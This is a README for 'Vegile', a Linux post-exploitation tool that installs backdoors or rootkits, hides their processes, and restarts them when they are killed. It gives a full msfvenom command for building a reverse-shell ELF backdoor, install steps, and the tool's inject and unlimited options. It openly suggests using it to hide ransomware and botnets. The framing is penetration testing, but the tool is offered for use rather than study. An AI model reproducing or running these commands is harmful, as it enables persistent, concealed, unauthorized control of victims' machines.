# Vegile - Ghost In The Shell

[![Version](https://img.shields.io/badge/Vegile-Beta-brightgreen.svg?maxAge=259200)]()
[![Stage](https://img.shields.io/badge/Release-Stable-brightgreen.svg)]()
[![Build](https://img.shields.io/badge/Supported_OS-Linux-orange.svg)]()

**Vegile** is a tool for **Post exploitation** Techniquesin linux. Post Exploitation techniques will ensure that we maintain some level of **access and can potentially** lead to **deeper** footholds into our targets **trusted network**.

### Donate
- If this project very help you to penetration testing  and u want support me , you can give me a cup of coffee :)
- [![Donation](https://img.shields.io/badge/bitcoin-donate-yellow.svg)](https://blockchain.info/id/address/1NuNTXo7Aato7XguFkvwYnTAFV2immXmjS)

## :book: How it works

This tool will setting up your ***backdoor/rootkits***
when backdoor already setup it will be ***hidden*** your spesisifc process,***unlimited*** your ***session*** in metasploit and ***transparent***.
Even when it **killed**, it will **re-run again**. There always be a procces which while **run** another process,
So we can assume that this procces is **unstopable** like a **Ghost in The Shell**

#### READ THIS

- right now i just tested backdoor with msfvenom command using reverse_shell [ **its work** ] 
- **msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=IP LPORT=PORT -b "\x00" -f elf -o NAME_BACKDOOR**
- for hidden process you can use for **rootkits,backdoor,ransom and botnet** { sh,python,perl,exe and binary }.
- Victim  target all linux distribution include ( **base32** and **base64** in their system ) 



## Getting Started
1. ```git clone https://github.com/Screetsec/Vegile.git```
2. ```cd Vegile```
3. ```chmod +x Vegile```

## Using Vegile
Running Vegile without any parameters will give a helpful list of the most common options. you can use command : 

- Vegile -i / --inject  **[backdoor/rootkit]**
- Vegile -u / --unlimited **[backdoor/rootkit]**
- Vegile -h / --help 


## :octocat: Credits

- Thanks to allah 
- Dracos Linux from Scratch Indonesia ( Awesome Penetration os ), you can see in http://dracos-linux.org/ 
- WingkoColi , Reversing ID , IndoXploit , Backbox Indonesia and Indonesia Backtrack Team .
- Offensive Security for the awesome OS ( http://www.offensive-security.com/ )
- http://www.kali.org/ Kali Linux
- www.github.com/gianlucaborello to give a reference 
- And another open sources tool in github



## Disclaimer

***Note: modifications, changes, or alterations to this sourcecode is acceptable, however,any public releases utilizing this code must be approved by writen this tool ( Edo -m- ).***
